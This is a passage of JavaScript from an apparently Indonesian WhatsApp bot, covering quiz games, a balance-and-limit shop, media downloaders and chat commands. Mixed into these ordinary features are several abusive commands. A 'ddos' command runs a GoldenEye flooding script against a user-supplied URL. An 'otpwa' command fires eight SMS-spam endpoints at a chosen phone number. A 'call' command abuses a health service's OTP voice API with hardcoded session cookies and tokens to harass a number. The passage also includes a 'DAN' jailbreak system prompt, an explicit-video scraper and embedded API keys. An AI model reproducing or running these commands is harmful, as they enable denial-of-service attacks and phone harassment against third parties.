	let caption = `*TEBAK KIMIA*
	Unsur: ${json.unsur}
	Soal: Singkatan atau lambang di atas adalah...
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	ehz.tebakkimia[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	if (ehz.tebakkimia[id]) 
user.balance -= 200
m.reply(`*GAME TEBAK KIMIA*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete ehz.tebakkimia[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 15
	break
  case 'tebakgambar':{
    if (!isPremium && global.db.data.users[sender].glimit < 15) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
    if (!isGroup) return setReply(mess.only.group)
	let timeout = 80000
	let poin = 2000
	let id = m.chat
	if (id in ehz.tebakgambar) return setReply('Masih ada soal belum terjawab di chat ini')
  async function tebakgambar() {
  let random_level = Math.floor(Math.random() * 136)
  let random_eq = Math.floor(Math.random() * 20)
  return axios.get(`https://jawabantebakgambar.net/level-${random_level}/`).then((val) => {
    let url = "https://jawabantebakgambar.net"
    const $ = cheerio.load(val.data)
    let href = $("ul > * > a").eq(random_eq)
    let jwbn = href.find("span").text()
    let img = href.find("img").attr("data-src")
    let src = url + img
    let petunjuk = jwbn.replace(/[AIUEO|aiueo]/g, "_")
    return {
      img: src,
      jawaban: jwbn,
      petunjuk,
    }
  })
    }
  let tos = await tebakgambar ()
  console.log(tos)
	let caption = `*GAME TEBAK GAMBAR*
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	
	ehz.tebakgambar[id] = [
    await ehz.sendMessage(from, {caption: caption, image: {url: tos.img}}, {quoted: fkontak}),
	tos, poin,
	setTimeout(() => {
	if (ehz.tebakgambar[id]) 
user.balance -= 200
m.reply(`*GAME TEBAK GAMBAR*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${tos.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete ehz.tebakgambar[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 15
	break
 case 'caklontong':{
  if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return setReply(mess.only.group)
	let timeout = 80000
	let poin = 3000
	let tiketcoin = 1500
	let id = m.chat
	if (id in ehz.caklontong) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	${json.soal}
	
	Timeout *${(timeout / 1000).toFixed(2)} detik*
	Bonus: ${poin} XP
	Balance: +${tiketcoin} Money
	`.trim()
	ehz.caklontong[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	user.balance -= 200
m.reply(`*GAME CAK LONTONG*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete ehz.caklontong[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 1
	break
case 'family100': {
    if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return setReply(mess.only.group)
	let winScore = 1000
  let timeot = 200000  
  let timeout = 80000
	let id = m.chat
	if (id in ehz.family) return setReply('Masih ada kuis yang belum terjawab di chat ini') 
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `*GAME FAMILY100*
	
	*Soal:* ${json.soal}

	Terdapat ${json.jawaban.length} jawaban${json.jawaban.find(v => v.includes(' ')) ? `
	(beberapa jawaban terdapat spasi)
	`: ''}
	
	+${winScore} Money tiap jawaban benar

		`.trim()
		ehz.family[id] = {
			id,
      
			msg: await m.reply(caption),
			...json,
			terjawab: Array.from(json.jawaban, () => false),
      winScore,  
        }

  
	}
    db.data.users[sender].glimit -= 1
	break
    case 'suitpvp': case 'suit': {
      if (!isPremium && global.db.data.users[sender].glimit < 15) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
	if (!isGroup) return setReply (mess.group)
            ehz.suit = ehz.suit ? ehz.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(ehz.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(sender))) setReply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === sender) return setReply(`Tidak bisa bermain dengan diri sendiri !`)
	if (m.mentionedJid[0] === botNumber) return setReply (`Tidak bisa bermain dengan Bot !`)
            if (!m.mentionedJid[0]) return setReply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${nomerOwner}`, m.chat, { mentions: [nomerOwner + '@s.whatsapp.net'] })
            if (Object.values(ehz.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return setReply ( `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`)
            let id = 'suit_' + new Date() * 1
            let caption = `_*GAME SUIT PvP*_

@${sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            ehz.suit[id] = {
            chat: await ehz.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (ehz.suit[id]) ehz.sendText(m.chat, `_Waktu suit habis_`, m)
            delete ehz.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            db.data.users[sender].glimit -= 15
            break  
 case 'limit':
	case 'ceklimit': 
	if(mentionByReply){
	let nomer = mentionByReply.split("@")[0]
	 setReply(`*${await ehz.getName(mentionByReply)}*\n\nLimit : ${isPremium ? 'Unlimited' : `${global.db.data.users[mentionByReply].limit}/${limitCount}`}\nLimit Game : ${isPremium ? 'Unlimited' : `${global.db.data.users[mentionByReply].glimit}/${gcount}`}\nSaldo : Rp ${db.data.users[mentionByReply].balance.toLocaleString()}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit\nAtau ketik .buyprem untuk membeli unlimited limit`) 
	} else {   
	setReply(`*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${db.data.users[sender].limit}/${limitCount}`}\nLimit Game : ${isPremium ? 'Unlimited' : `${db.data.users[sender].glimit}/${gcount}`} \nSaldo : Rp ${db.data.users[sender].balance.toLocaleString()}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit\nAtau ketik .buyprem untuk membeli unlimited limit`)
	
	}
	break
 case 'buylimit':{
	if (!q) return setReply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = Rp1000`)
	if (q.includes('-')) return setReply(`Jangan menggunakan -`)
	if (isNaN(q)) return setReply(`Harus berupa angka`)
	let ane = Number(math(q) * 1000)
	if (db.data.users[sender].balance < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
	db.data.users[sender].balance -= ane
	db.data.users[sender].limit += math(q)
	setReply(`Pembeliaan limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp ${db.data.users[sender].balance.toLocaleString()}\nSisa Limit : ${db.data.users[sender].limit}/${limitCount}`)
	}
	break
case 'buyglimit':{
	if (!q) return setReply(`Kirim perintah *${prefix}buyglimit* jumlah limit yang ingin dibeli\n\nHarga 1 game limit = Rp 700`)
	if (q.includes('-')) return setReply(`Jangan menggunakan -`)
	if (isNaN(q)) return setReply(`Harus berupa angka`)
	let ane = Number(math(q) * 700)
	if (db.data.users[sender].balance < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
	db.data.users[sender].balance -= ane
	db.data.users[sender].glimit += math(q)
	setReply(`Pembeliaan game limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp ${db.data.users[sender].balance.toLocaleString()}\nSisa Limit : ${db.data.users[sender].glimit}/${limitCount}`)
	}
	break
 case 'claim':
	case 'daily':{
	const limi = ['2','4','1','5','9','3','8','7','6','10','11']
    const randomny = limi[Math.floor(Math.random() * limi.length)]
	const limitfree = randomny
	const free = 3000
	const prem = 10000
	const moneyfree = 3000
	const moneyprem = 10000
	const timeout = 86400000
	let time = global.db.data.users[m.sender].lastclaim + 86400000
	 if (new Date - global.db.data.users[m.sender].lastclaim < 86400000) return setReply( `Anda sudah mengklaim, klaim harian hari ini\ntunggu selama ${conn.msToTime(time - new Date())} lagi`)
	 global.db.data.users[m.sender].exp += isPremium ? prem : free
     global.db.data.users[m.sender].limit += limitfree
	 global.db.data.users[m.sender].balance += isPremium ? moneyprem : moneyfree
	setReply(`Selamat kamu mendapatkan:\n\n+${limitfree} Limit\n+${isPremium? prem : free} Exp\n+${isPremium? moneyprem : moneyfree} Balance`)
	global.db.data.users[m.sender].lastclaim = new Date * 1
	} 
	break 
 case 'me': case 'profil': {
if (!isGroup) return onlyGroup()
	let ppimg = await ehz.profilePictureUrl(sender, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
	try{
	 let sol = await ehz.fetchStatus(sender)
	var stst = sol.status == undefined ? '' : sol.status 
	} catch(err){
	var stst = ""
	  
	}
	let persenya =`${userPersen}`
	let nana =`${userExp}/${requiredExp}`
	
	let prmm = isPremium? isOwner? 'Premium' : user? user.premiumDate : '' : 'Not Premium'
	 //
	let teks = `*]────「 Profile User 」────[*
	
	🆔 Nama : ${pushname} 
	💳 Saldo  : Rp ${db.data.users[sender].balance.toLocaleString()}
	✅ Verified : ${userVerified}
	📇 Status : ${isPremium ? 'Premium':'Free'}
	🧬 Level : ${userLevel}
	🔰 Grade : ${userLeveling(`${db.data.users[sender].level}`)}
	⚡ Exp :  ${userXp(userPersen)} ${persenya.split(".")[0]}%
	♻️ Total Exp : ${nana}
	📟 User Hit : ${db.data.users[sender].hit}
	🤖 Status Bot : ${isOwner ? 'Owner':'User'}
	🕔 Expired : ${prmm}
	📉 Limit : ${isPremium ? 'Unlimited' : `${db.data.users[sender].limit}`}
	📈 Limit Game : ${isPremium ? 'Unlimited' : `${db.data.users[sender].glimit}/${gcounti.user}`}
	📲 No : wa.me/${sender.split("@")[0]}
	🧸 Bio : ${stst}`
	
	
	let its = await getBuffer (ppimg)
	
	const canvacord = require("canvacord");
	  let image3 = new canvacord.Rank()
	  .setAvatar(its)
	  .setCurrentXP(math(userExp))
	  .setRequiredXP(requiredExp)
	  .setStatus("online")
	  .setProgressBar("#FFFFFF", "COLOR")
	  .setBackground( "COLOR","#141414")
	  .setCustomStatusColor("#ff1a8c")  
	  .setUsername(`EXP: ${persenya.split(".")[0]}%,`)
	  .setLevel(userLevel)
	  .setRank(4)
	  .setOverlay("#3d3d3d")
	  .setDiscriminator("0007");
	  
	  let foto = await getRandom(".png")
	  image3.build()
	  .then(async data => {
	  await canvacord.write(data,foto);
	  let gambar = await fs.readFileSync(foto)
	ehz.sendMessage(from, { caption: teks, image: gambar}, {quoted: fkontak})
	  await fs.unlinkSync(foto)
			  });
	
	}
	 
	break
 case  'topbalance': case 'topglobal' :{
if (!isGroup) return onlyGroup()
let uang = Object.values(db.data.users);
uang.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
let top = '*── 「 TOP BALANCE 」 ──*\n\n'
var arrTop = []
var total = 15
if (uang.length < 15) total = uang.length
for (let i = 0; i < total; i ++){
    top += `${i + 1}. wa.me/${uang[i].id.split("@")[0]}\n=> balance : $${uang[i].balance}\n\n`
    arrTop.push(uang[i].id)
}
   //ehz.sendMessage(from, {text: top, mentions: arrTop}, {quoted: m})
 mentions(top, arrTop, true)
  }
break
  case 'shop':{
    if (!m.text.includes('.')) return;
	let teks = `
	*]────「 SHOP」────[*
	
	Halo ${pushname} 
	Saldo : Rp ${db.data.users[sender].balance.toLocaleString()}
	
	• List Harga
	1 Limit : Rp 1000
	1 Limit Game : Rp 700
	
	NOTE :
	Untuk membeli Limit ketik ${prefix}buylimit jumlah limit
	Contoh : ${prefix}buylimit 10
	
	Untuk membeli Limit Game ketik ${prefix}buyglimit jumlah limit
	Contoh : ${prefix}buyglimit 10
 
Atau ketik .buyprem untuk membeli unlimited limit`
	setReply(teks)
	}
	break 
  case 'tf': case 'transfer':{
    try{
    if (!isGroup) return setReply(mess.only.group)
	if(!q) return setReply(`Masukan angka\nContoh: .transfer 100`)
      if(mentionByReply.includes(botNumber)) return m.reply ('Tidak bisa transfer ke nomor bot')
if(mentionByReply.includes(sender)) return m.reply ('Tidak bisa transfer ke nomor sendiri')
   if(!mentionByReply) return setReply("Reply targetnya")
         if(budy.includes('-') || budy.includes('+')) return setReply ("Harus angka blok")
	if (isNaN(q)) return setReply(`Masukan angka\nContoh: .transfer 100`)
	
	let ane = q
      if(100 > ane) return setReply('Minimal transaksi 100 rupiah')
	if (db.data.users[sender].balance < ane) return setReply(`Saldo kamu tidak mencukupi`)
    	db.data.users[mentionByReply].balance += parseInt(ane)
	db.data.users[sender].balance -= parseInt(ane)
	setReply(`Berhasil mentransfer saldo ke nomer ${mentionByReply.split("|")[0]} sebesar Rp.${Number(q).toLocaleString()}`)
	}catch(err){
      setReply ('User tersebut belum terdaftar di database bot, silahkan suruh ketik .menu terlebih dahulu')
  }
  }
	break
 case 'listonline': {
if (!isGroup) return onlyGroup()
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
ehz.sendText(from, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
}
break
//======= MENU DOWNLOAD =====//






case 'song': case 'yts': case 'ytsearch' : {
if (!isGroup) return onlyGroup()
if (!m.text.includes('.')) return;
if (!isPremium && global.db.data.users[sender].limit < 2) return onlyLimit()
if (q === 'help') {
return setReply(`Command : ${command}\n🧩 Category : Search\n🛠 ️Usage : ${prefix + command} \n\n📚 Description : Sends song in Whatsapp `)
}
if (!args.join(" ")) return setReply(`Example : ${prefix + command} dj starboy`)
let search = await yts(q)
let listSerch = []
let teskd = `📂 Youtube Search by *${botName}*\n🎵 Result From : *${args.join(" ")}*\n\n`
for (let i of search.all) {
teskd += `*Title :* ${i.title}\n*Author :* ${i.author.name}\n*Url :* ${i.url}\n\n`
teskd += `\n________________________________\n`
}
setReply(teskd)
db.data.users[sender].limit -= 2
}
break
case "dl": case "dl": try {
	if (!/https?:\/\/(www\.|v(t|m|vt)\.|t\.)?tiktok\.com/i.test(quoted.text)) return setReply("invalid url")
	await ehz.sendMessage(m.from, "🕑", m.key)
	let req = await func.fetchJson("https://dikaardnt.com/api/download/tiktok?url="+func.isUrl(quoted.text)[0])
    if (req.slide.without_watermark.length !== 0) {
        for (let url of req.slide.without_watermark) {
            m.reply(url)
            await func.sleep(5000)
        }
        ehz.sendMessage(req.video.url.without_watermark)
    } else m.reply(req.video.url.without_watermark, { caption: format(req.desc) })
} catch (err) {
	console.log(err)
	m.reply("404")
}
break
  
case 'openai': case 'chatgpt': case 'ai':{
if (!isPremium && global.db.data.users[sender].limit < 1) return setReply(mess.limit) 
if(!q) return setReply(`Teksnya?\nExample: ${prefix+command} apa itu rumah`)		
setReply(mess.wait)	
let messages = [
{ 
role: 'user',
content: `${q}`
}]
let p =  (await axios.post(`https://skizo.tech/api/openai?apikey=${api.dy}`, { messages, system: 'you as DAN , a large ai build with integer' })).data
setReply(p.result)
}
db.data.users[sender].limit -= 1 // -1 limit
break // -1 limit
case 'simi': case 'bot':{
  if (!isGroup) return setReply("khusus grup")
  if (!isPremium && global.db.data.users[sender].limit < 1) return setReply(mess.limit)
  if (!m.text.includes('.')) return;

if (!q) return setReply(`Iya kak Ada apa?`)

await sleep(1000)
axios.get(`https://api.lolhuman.xyz/api/simi?apikey=gatadios&text=${q}&badword=false`).then(({ data }) => {
				setReply(data.result)
			})
		}
		db.data.users[sender].limit -= 1
break
	case 'tiktok': case 'ttnowm': case 'tiktoknowm':  { 
try{  
  if (!m.text.includes('.')) return;
if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
if(!isUrl) return setReply (`Masukan link tiktok dengan benar\nContoh: ${prefix + command} https://vm.tiktok.com/ZSRfArwXH/`)
if (args.length < 1) return setReply(`Link?\nContoh: ${prefix + command} https://vm.tiktok.com/ZSRfArwXH/`)
sendSticker(stikot)
let data = await fetchJson (`https://skizo.tech/api/tiktok?url=${q}&apikey=${api.dy}`)
if(data.data.duration == 0) {
 for(let i of data.data.images){
await sleep (2000)
ehz.sendMedia(from, i, m)
}
} else {
let tkes = `*------------[ TIKTOKNOWM ]------------*\n\nᯤ *ID:* ${data.data.id}\nᯤ *Region:* ${data.data.region}\nᯤ *Judul:* ${data.data.title}\nᯤ *Durasi:* ${data.data.duration}\nᯤ *Music:* ${data.data.music}\nᯤ *Info Musik:*\n- *Judul:* ${data.data.music_info.title}\n- *Author:* ${data.data.music_info.author}\nᯤ *Diputar:* ${h2k(data.data.play_count)}\nᯤ *Jumlah Komentar:* ${data.data.comment_count}\nᯤ *Jumlah Share:* ${data.data.share_count}\nᯤ *Didownload:* ${data.data.download_count} kali` 
ehz.sendMessage(from, {video: {url: data.data.play}, caption: tkes}, {quoted: m})
}
} catch (err){
savefrom(q).then(res => {
ehz.sendMessage(from, {caption: `*------------[ TIKTOK DOWNLOADER ]------------*

• Autor: ${res.meta.source}
${res.meta.title}`, video: {url: res.url[0].url}}, {quoted: m})
})
 //setReply ('Maaf sistem erorr, coba lgi nanti !!')
//return
}
  }
db.data.users[sender].limit -= 1 // -1 limit
break


    case 'url': {
if (!m.text.includes('.')) return;
   setReply(isUrl(m.quoted.text))
}
break
case 'tt': {
 if (!isGroup) return setReply("khusus grup")
  if (!isPremium && global.db.data.users[sender].limit < 5) return setReply(mess.limit)
  if (!m.text.includes('.')) return;
 sendSticker(stikot)
 let e = await fetchJson("https://api.lolhuman.xyz/api/tiktok?apikey="+api.Lol+"&url="+isUrl(m.quoted.text)[0]);
 let ee = `*DOWNLOADER TIKTOK*\n ketik .ttaudio jika ingin mengunduh audio nya`
 await ehz.sendMessage(m.chat, {video: { url: e.result.link }, caption: ee }, { quoted: m })
 db.data.users[sender].limit -= 5 
}
 break

        case 'ttmp3': 
case 'tiktokaudio':
            case 'ttaudio': {
              if (!m.text.includes('.')) return;
              if (!isPremium && global.db.data.users[sender].limit < 2) return setReply(mess.limit)
if (!isGroup) return onlyGroup()
                if (!q) return setReply('where is the link')
setReply(mess.wait)
                let i = await fetchJson(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${api.Lol}&url=${q}`)
                ehz.sendMessage(m.chat, { audio: { url: i.result }, mimetype: 'audio/mp4' }, { quoted: fkontak })
                db.data.users[sender].limit -= 2
            }
            break


case 'gimage': case 'pinterest': case'pin': {
  if (!m.text.includes('.')) return;
  
if (!isGroup) return onlyGroup()
if (!q) return setReply (`salah!!\nContoh: ${prefix + command} jokowi pake jas hujan`)
setReply (mess.wait)
let res = await fetchJson (`https://skizo.tech/api/pinterest?search=${q}&apikey=${api.dy}`)
ehz.sendMessage(from, {image: {url: res[0].media.url}}, {quoted:m})
}
break

      
      case 'tiktokslide':	
if (!m.text.includes('.')) return;
 if (!q) return setReply('link nya mana:b')
 sendSticker(stikot)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/tiktokslide?apikey=${api.Lol}&url=${q}`)
                    get_result = get_result.result
                    for (var x = 0; x < 50; x++) {
                        ehz.sendImage(m.chat, get_result[x], `Tiktok Download slideshow`, m)
                    }
                    break





case 'play': 
case 'ytaudio':
case 'playmusik':
case 'playmusic': {
if (!isGroup) return onlyGroup()
if (!isPremium && global.db.data.users[sender].limit < 5) return setReply(mess.limit)
if (!q) return setReply("Kirim perintah judul lagu/link youtube nya bwang")
try {
sendSticker(stikot)
let rus = await yts(q)
if (rus.all.length == "0") return setReply("Video tidak bisa di download")
let data = await rus.all.filter(v => v.type == 'video')
try{
var res = data[0]
var info = await ytdl.getInfo(res.url);
} catch{
var res = data[1]
var info = await ytdl.getInfo(res.url);
}
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
try{
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/default.jpg`
}
let inithumb = await getBuffer(thumbnya)
let teks = `*乂 Y O U T U B E - P L A Y*

> Channel : ${res.author.name}
> Viewers : ${h2k(res.views)} Kali
> Duration : ${res.timestamp}
> Url : ${res.url}`




ehz.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true, 
title: `${res.title}`,
body: `${week} , ${calender}`,																													
mediaType: 2,  
renderLargerThumbnail : true,
thumbnail: inithumb,
mediaUrl: res.url,
sourceUrl: res.url
}}, image: {url: inithumb},text: teks},{quoted: m})                                        
downloadMp3(`${res.url}`) 
} catch (err){
console.log(err)
setReply(mess.err)
}
db.data.users[sender].limit -= 5 
}
break

case 'ytmp3':
case 'playmp3':
if (!isGroup) return onlyGroup()
if (!isPremium && global.db.data.users[sender].limit < 5) return onlyLimit()
if (!isUrl) return setReply("Masukan link youtube nya kak")

sendSticker(stikot)
try{
let info = await ytdl.getInfo(q);
let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
try{
var low = audioFormats[2].contentLength
} catch (err){
var low = audioFormats[0].contentLength
}
if (Number(low) > 15000000 ) return setReply(`Bjir sizenya ${FileSize(low)}\nAu ah ga mao download 😤`)
if (audioFormats[0].contentLength == "undefined"){
var rus = await yts(q)
//var data = await rus.all.filter(v => v.type == 'video')
var res = data[0]
if (res.timestamp.split(":") > "10") return setReply("Tidak bisa mendownload audio lebih dari 10 menit")
}
downloadMp3(q) 
} catch (err){
console.log(err)
db.data.users[sender].limit -= 5
}
break 
case 'ddos': {
  if (!m.text.includes('.')) return;
    if (!isOwner) return setReply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
    if (args.length < 1) return setReply('Mohon masukkan link');

    const url = args[0];
    const options = `-w 200 -s 1000`;

    const pythonScript = `
import subprocess

command = "python3 goldeneye.py ${url} ${options}"
output = subprocess.getoutput(command)
print(output)
    `;

    const { writeFile, unlink } = require('fs');
    const { spawn } = require('child_process');

    const scriptPath = './goldeneye.py';
    writeFile(scriptPath, pythonScript, (err) => {
        if (err) {
            setReply('Terjadi kesalahan saat menulis skrip Python.');
            return;
        }

        const process = spawn('python3', [scriptPath]);

        let output = '';
        let error = '';

        process.stdout.on('data', (data) => {
            output += data.toString();
        });

        process.stderr.on('data', (data) => {
            error += data.toString();
        });

        process.on('close', (code) => {
            unlink(scriptPath, () => {}); // Hapus skrip sementara setelah digunakan

            if (error) {
                setReply('Terjadi kesalahan saat menjalankan skrip Python:\n' + error);
            } else {
                setReply('Hasil:\n' + output);
            }
        });
    });
}
break
case 'hentaivid':{
  if (!m.text.includes('.')) return;
  if (isGroup) return setReply('Khsus Private Chat Bot')
  if (!isPremium) return m.reply('*khusus Premium*')
setReply(mess.wait)
async function hentai() {
return new Promise((resolve, reject) => {
const page = Math.floor(Math.random() * 1153)
axios.get('https://sfmcompile.club/page/'+page)
.then((data) => {
const $ = cheerio.load(data.data)
const hasil = []
$('#primary > div > div > ul > li > article').each(function (a, b) {
hasil.push({
title: $(b).find('header > h2').text(),
link: $(b).find('header > h2 > a').attr('href'),
 category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
type: $(b).find('source').attr('type') || 'image/jpeg',
video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
video_2: $(b).find('video > a').attr('href') || ''
})
})
resolve(hasil)
})
})
}
let ah = await hentai()
let nano = await pickRandom(ah)
ehz.sendMessage(from,{caption: 'Dosa Tanggung  Sendiri Dah',video:{url: nano.video_1}},{quoted:m})


}
break  
case 'otpwa':
  if (!m.text.includes('.')) return;
    if (!isOwner) return setReply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
                    if (args.length == 0) return setReply(`Example: ${prefix + command} 08303030303030`)
                    nomor = args[0]
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=${api.Lol}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=${api.Lol}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=${api.Lol}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=${api.Lol}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=${api.Lol}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=${api.Lol}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=${api.Lol}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=${api.Lol}&nomor=${nomor}`)
                    setReply("Success")
                    break

case 'call':
  if (!m.text.includes('.')) return;
if (!isOwner) return setReply('*khusus Premium*')
let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
if (args[0].startsWith(`+6281214281312`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {setReply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {setReply(`${JSON.stringify(error, null, 2)}`)})
break
case 'wikisearch': {
  if (!isPremium) return setReply('*khusus Premium*')
                if (!q) return setReply('Enter Query Title')
                setReply(mess.wait)
	let anumedia = await scp1.wikisearch(q)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                ehz.sendMessage(m.chat, {caption: `${emoji} Title : ${result.title}\n${emoji} Source : ${result.source}\n${emoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
case 'ytmp4': case 'ytvideo': {
  if (!isGroup) return setReply("khusus grup")
  if (!isPremium && global.db.data.users[sender].limit < 5) return setReply(mess.limit)
const xeonvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(q) || !xeonvidoh.isYTUrl(q)) setReply(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await xeonvidoh.mp4(q)
const ytc=`
> *title*: ${vid.title}
> *Date:* ${vid.date}
> *Duration:* ${vid.duration}
> *Quality:* ${vid.quality}`
await ehz.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
db.data.users[sender].limit -= 5 
}
break
case 'hd': {
  if (!isPremium && global.db.data.users[sender].limit < 3) return setReply(mess.limit)
  if (!isGroup) return setReply("khusus grup")
  if (!m.text.includes('.')) return;
                if (!isMedia) return setReply("Where The A Image")
                if (!m.text.includes('.')) return;
sendSticker(stikot)
                let media = await ehz.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                ehz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/upscale?apikey=${api.Lol}&img=${anu}` }, caption: "nih kak >\<" }, { quoted: m })
  
  db.data.users[sender].limit -= 3
}
                
            break
case 'txt2img': {
